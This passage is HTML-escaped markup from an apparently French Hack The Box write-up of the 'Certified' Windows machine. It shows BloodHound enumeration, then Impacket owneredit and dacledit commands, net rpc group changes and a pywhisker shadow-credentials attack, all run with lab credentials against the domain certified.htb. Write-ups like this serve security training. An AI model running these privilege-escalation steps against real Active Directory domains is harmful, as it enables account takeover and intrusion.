+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Connecting&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">LDAP&lt;/span> &lt;span class="nx">server&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">dc01&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Found&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="nx">domains&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Found&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="nx">domains&lt;/span> &lt;span class="nx">in&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">forest&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Found&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="nx">computers&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Connecting&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">LDAP&lt;/span> &lt;span class="nx">server&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">dc01&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Found&lt;/span> &lt;span class="mi">10&lt;/span> &lt;span class="nx">users&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Found&lt;/span> &lt;span class="mi">53&lt;/span> &lt;span class="nx">groups&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Found&lt;/span> &lt;span class="mi">2&lt;/span> &lt;span class="nx">gpos&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Found&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="nx">ous&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Found&lt;/span> &lt;span class="mi">19&lt;/span> &lt;span class="nx">containers&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Found&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="nx">trusts&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Starting&lt;/span> &lt;span class="nx">computer&lt;/span> &lt;span class="nx">enumeration&lt;/span> &lt;span class="nx">with&lt;/span> &lt;span class="mi">10&lt;/span> &lt;span class="nx">workers&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Querying&lt;/span> &lt;span class="nx">computer&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">DC01&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Done&lt;/span> &lt;span class="nx">in&lt;/span> &lt;span class="mo">00&lt;/span>&lt;span class="nx">M&lt;/span> &lt;span class="mo">03&lt;/span>&lt;span class="nx">S&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;p>Dans BloodHound, nous pouvons facilement remarquer quel chemin prendre afin d&amp;rsquo;obtenir un accès interactif avec la machine.
+&lt;img src="https://01MI.github.io/p/certified-htb-writeup-windows-medium/BH_path.PNG"
+width="954"
+height="114"
+srcset="https://01MI.github.io/p/certified-htb-writeup-windows-medium/BH_path_hu_111cd9e9f8f0bd96.PNG 480w, https://01MI.github.io/p/certified-htb-writeup-windows-medium/BH_path_hu_ade328becd971800.PNG 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="836"
+data-flex-basis="2008px"
+>&lt;/p>
+&lt;h2 id="user">User
+&lt;/h2>&lt;h3 id="judith---management-group">Judith -&amp;gt; Management Group
+&lt;/h3>&lt;p>Nous remarquons que &lt;em>Judith&lt;/em> a la permission &lt;code>WriteOwner&lt;/code> sur le groupe &lt;em>management&lt;/em>.
+Cette permission nous permet d&amp;rsquo;ajouter &lt;em>Judith&lt;/em> en tant que propriétaire et membre du groupe.
+&lt;img src="https://01MI.github.io/p/certified-htb-writeup-windows-medium/BH_judith.png"
+width="1265"
+height="156"
+srcset="https://01MI.github.io/p/certified-htb-writeup-windows-medium/BH_judith_hu_e7e9ca3a36809f6d.png 480w, https://01MI.github.io/p/certified-htb-writeup-windows-medium/BH_judith_hu_30606136c0dcf6ca.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="810"
+data-flex-basis="1946px"
+>&lt;/p>
+&lt;p>Premièrement, nous changeons le propriétaire du groupe.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">owneredit&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">action&lt;/span> &lt;span class="nx">write&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">new&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">owner&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">judith&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">mader&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">target&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">MANAGEMENT&lt;/span>&lt;span class="sc">&amp;#39; &amp;#39;&lt;/span>&lt;span class="nx">CERTIFIED&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HTB&lt;/span>&lt;span class="sc">&amp;#39;/&amp;#39;&lt;/span>&lt;span class="nx">judith&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">mader&lt;/span>&lt;span class="sc">&amp;#39;:&amp;#39;&lt;/span>&lt;span class="nx">judith09&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Impacket&lt;/span> &lt;span class="nx">v0&lt;/span>&lt;span class="mf">.12.0&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nx">Copyright&lt;/span> &lt;span class="nx">Fortra&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">LLC&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">its&lt;/span> &lt;span class="nx">affiliated&lt;/span> &lt;span class="nx">companies&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Current&lt;/span> &lt;span class="nx">owner&lt;/span> &lt;span class="nx">information&lt;/span> &lt;span class="nx">below&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nx">SID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">S&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">21&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">729746778&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">2675978091&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">3820388244&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">512&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nx">sAMAccountName&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Domain&lt;/span> &lt;span class="nx">Admins&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nx">distinguishedName&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">CN&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">Domain&lt;/span> &lt;span class="nx">Admins&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">CN&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">Users&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">DC&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">certified&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">DC&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">htb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">OwnerSid&lt;/span> &lt;span class="nx">modified&lt;/span> &lt;span class="nx">successfully&lt;/span>&lt;span class="p">!&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;p>Ensuite, nous ajoutons &lt;em>Judith&lt;/em> en tant que membre du groupe.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 7
+&lt;/span>&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">11
+&lt;/span>&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">13
+&lt;/span>&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">dacledit&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">k&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">judith&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">mader&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">judith09&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">dc&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">ip&lt;/span> &lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">principal&lt;/span> &lt;span class="nx">judith&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">mader&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">target&lt;/span> &lt;span class="s">&amp;#34;management&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">action&lt;/span> &lt;span class="nx">write&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">rights&lt;/span> &lt;span class="nx">FullControl&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">CCache&lt;/span> &lt;span class="nx">file&lt;/span> &lt;span class="nx">is&lt;/span> &lt;span class="nx">not&lt;/span> &lt;span class="nx">found&lt;/span>&lt;span class="p">.&lt;/span> &lt;span class="nx">Skipping&lt;/span>&lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">DACL&lt;/span> &lt;span class="nx">backed&lt;/span> &lt;span class="nx">up&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">dacledit&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">20250314&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">002015.&lt;/span>&lt;span class="nx">bak&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">DACL&lt;/span> &lt;span class="nx">modified&lt;/span> &lt;span class="nx">successfully&lt;/span>&lt;span class="p">!&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">net&lt;/span> &lt;span class="nx">rpc&lt;/span> &lt;span class="nx">group&lt;/span> &lt;span class="nx">members&lt;/span> &lt;span class="s">&amp;#34;management&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">U&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">judith&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">mader&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">S&lt;/span> &lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Password&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">WORKGROUP&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">judith&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">mader&lt;/span>&lt;span class="p">]:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">CERTIFIED&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">management_svc&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">net&lt;/span> &lt;span class="nx">rpc&lt;/span> &lt;span class="nx">group&lt;/span> &lt;span class="nx">addmem&lt;/span> &lt;span class="s">&amp;#34;management&amp;#34;&lt;/span> &lt;span class="nx">judith&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">mader&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">U&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">judith&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">mader&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">S&lt;/span> &lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">net&lt;/span> &lt;span class="nx">rpc&lt;/span> &lt;span class="nx">group&lt;/span> &lt;span class="nx">members&lt;/span> &lt;span class="s">&amp;#34;management&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">U&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">judith&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">mader&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">S&lt;/span> &lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Password&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">WORKGROUP&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">judith&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">mader&lt;/span>&lt;span class="p">]:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">CERTIFIED&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">judith&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">mader&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">CERTIFIED&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">management_svc&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;h3 id="management-group---management_svc">Management group -&amp;gt; management_svc
+&lt;/h3>&lt;p>En revenant sur BloodHound, nous remarquons que &lt;em>management_svc&lt;/em> est kerberoastable mais le hash obtenu n&amp;rsquo;est pas crackable.
+Nous pouvons voir que les membres du groupe &lt;em>management&lt;/em> ont la permission &lt;code>GenericWrite&lt;/code> sur l&amp;rsquo;utilisateur &lt;em>management_svc&lt;/em>.
+En exploitant cette permission, nous pouvons utiliser la technique shadow credentials afin d&amp;rsquo;obtenir le NT hash de &lt;em>management_svc&lt;/em>.
+&lt;img src="https://01MI.github.io/p/certified-htb-writeup-windows-medium/BH_management.png"
+width="1389"
+height="164"
+srcset="https://01MI.github.io/p/certified-htb-writeup-windows-medium/BH_management_hu_4ac06eebca9b4cce.png 480w, https://01MI.github.io/p/certified-htb-writeup-windows-medium/BH_management_hu_c07d0e77a57087a.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="846"
+data-flex-basis="2032px"
+>&lt;/p>
+&lt;p>Premièrement, nous générons un fichier &lt;em>.pfx&lt;/em> et l&amp;rsquo;utilisons pour alimenter l&amp;rsquo;attribut &lt;code>msDS-KeyCredentialLink&lt;/code> de &lt;em>management_svc&lt;/em> en utilisant Pywhisker.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">pywhisker&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">d&lt;/span> &lt;span class="s">&amp;#34;certified.htb&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="s">&amp;#34;judith.mader&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="s">&amp;#34;judith09&amp;#34;&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">target&lt;/span> &lt;span class="s">&amp;#34;management_svc&amp;#34;&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">action&lt;/span> &lt;span class="s">&amp;#34;add&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Searching&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">target&lt;/span> &lt;span class="nx">account&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Target&lt;/span> &lt;span class="nx">user&lt;/span> &lt;span class="nx">found&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">CN&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">management&lt;/span> &lt;span class="nx">service&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">CN&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">Users&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">DC&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">certified&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">DC&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">htb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Generating&lt;/span> &lt;span class="nx">certificate&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Certificate&lt;/span> &lt;span class="nx">generated&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Generating&lt;/span> &lt;span class="nx">KeyCredential&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">KeyCredential&lt;/span> &lt;span class="nx">generated&lt;/span> &lt;span class="nx">with&lt;/span> &lt;span class="nx">DeviceID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">d1df9aac&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">ae1&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">36e0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">f803&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">d8e369ed930e&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Updating&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">msDS&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">KeyCredentialLink&lt;/span> &lt;span class="nx">attribute&lt;/span> &lt;span class="nx">of&lt;/span> &lt;span class="nx">management_svc&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Updated&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">msDS&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">KeyCredentialLink&lt;/span> &lt;span class="nx">attribute&lt;/span> &lt;span class="nx">of&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">target&lt;/span> &lt;span class="nx">object&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Converting&lt;/span> &lt;span class="nx">PEM&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nx">PFX&lt;/span> &lt;span class="nx">with&lt;/span> &lt;span class="nx">cryptography&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">9&lt;/span>&lt;span class="nx">JZGbAPu&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">pfx&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">PFX&lt;/span> &lt;span class="nx">exportiert&lt;/span> &lt;span class="nx">nach&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">9&lt;/span>&lt;span class="nx">JZGbAPu&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">pfx&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Passwort&lt;/span> &lt;span class="nx">für&lt;/span> &lt;span class="nx">PFX&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">c2U4qtZsMkLNEedx4nFb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Saved&lt;/span> &lt;span class="nf">PFX&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="err">#&lt;/span>&lt;span class="nx">PKCS12&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">certificate&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="nx">key&lt;/span> &lt;span class="nx">at&lt;/span> &lt;span class="nx">path&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">9&lt;/span>&lt;span class="nx">JZGbAPu&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">pfx&lt;/span>
